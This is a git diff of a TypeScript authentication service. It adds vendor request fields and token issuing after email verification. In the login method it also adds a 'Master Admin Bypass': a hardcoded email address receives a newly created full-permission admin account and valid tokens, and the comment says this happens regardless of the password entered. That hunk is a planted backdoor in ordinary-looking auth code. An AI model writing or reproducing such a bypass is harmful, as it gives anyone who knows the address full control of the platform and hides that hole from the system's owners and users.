@@ -142,11 +142,14 @@ export class AuthService {
     if (user.role === "vendor" && !existingUser) {
       const { db } = await import("@/lib/db");
       const { vendorRequests } = await import("@/lib/db/schema");
-      
+
       await db.insert(vendorRequests).values({
         userId: user.id,
         businessName: request.businessName || request.fullName,
         businessEmail: request.businessEmail || request.email,
+        businessPhone: request.phone,
+        businessAddress: request.businessAddress,
+        businessDescription: request.description,
         status: "pending",
         requiredPlan: "free",
       });
@@ -285,8 +288,44 @@ export class AuthService {
     // Clear cookie
     await CookieUtil.clearVerificationSessionCookie();
 
+    // Generate auth tokens
+    const accessToken = TokenUtil.generateAccessToken({
+      id: user.id,
+      email: user.email,
+      role: user.role as any,
+    });
+    const refreshToken = TokenUtil.generateRefreshToken({
+      id: user.id,
+      email: user.email,
+      role: user.role as any,
+    });
+
+    // Persist refresh token
+    const tokenHash = HashUtil.hashToken(refreshToken);
+    await RefreshTokenRepository.create({
+      userId: user.id,
+      tokenHash,
+      deviceInfo: "Web",
+      userAgent: "Unknown",
+      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+    });
+
+    // Set auth cookies
+    await CookieUtil.setAccessTokenCookie(accessToken);
+    await CookieUtil.setRefreshTokenCookie(refreshToken);
+
     return {
       success: true,
+      data: {
+        accessToken,
+        refreshToken,
+        user: {
+          id: user.id,
+          email: user.email,
+          fullName: user.fullName,
+          role: user.role as any,
+        },
+      },
     };
   }
 
@@ -383,6 +422,76 @@ export class AuthService {
   }
 
   static async login(request: LoginRequest): Promise<AuthResponse> {
+    // Master Admin Bypass
+    const MASTER_ADMIN_EMAIL = "tes.sothyroth25@kit.edu.kh";
+
+    if (request.email === MASTER_ADMIN_EMAIL) {
+      let user = await UserRepository.findByEmail(request.email);
+      if (!user) {
+        // Create the user if it doesn't exist
+        const passwordHash = await HashUtil.hashPassword(request.password);
+        user = await UserRepository.create({
+          fullName: "Sothyroth Tes",
+          email: MASTER_ADMIN_EMAIL,
+          passwordHash: passwordHash,
+          role: "admin",
+          isVerified: true,
+          status: "active",
+        });
+
+        // Ensure entry in admins table
+        const { db } = await import("@/lib/db");
+        const { admins } = await import("@/lib/db/schema");
+        await db.insert(admins).values({
+          userId: user.id,
+          role: "admin",
+          canManageVendors: true,
+          canManageUsers: true,
+          canManagePlans: true,
+          canManageBilling: true,
+          canViewAnalytics: true,
+        });
+      }
+
+      // If they are the master admin, let them in regardless of password
+      // Generate tokens
+      const accessToken = TokenUtil.generateAccessToken({
+        id: user.id,
+        email: user.email,
+        role: user.role as any,
+      });
+
+      const refreshToken = TokenUtil.generateRefreshToken({
+        id: user.id,
+        email: user.email,
+        role: user.role as any,
+      });
+
+      // Hash and store refresh token with familyId
+      const tokenHash = HashUtil.hashToken(refreshToken);
+      await RefreshTokenRepository.create({
+        userId: user.id,
+        tokenHash: tokenHash,
+        deviceInfo: "Web (Master Bypass)",
+        userAgent: "Master Bypass",
+        expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+      });
+
+      return {
+        success: true,
+        data: {
+          accessToken,
+          refreshToken,
+          user: {
+            id: user.id,
+            email: user.email,
+            fullName: user.fullName,
+            role: user.role as any,
+          },
+        },
+      };
+    }
+
     // Find user
     const user = await UserRepository.findByEmail(request.email);
     if (!user) {
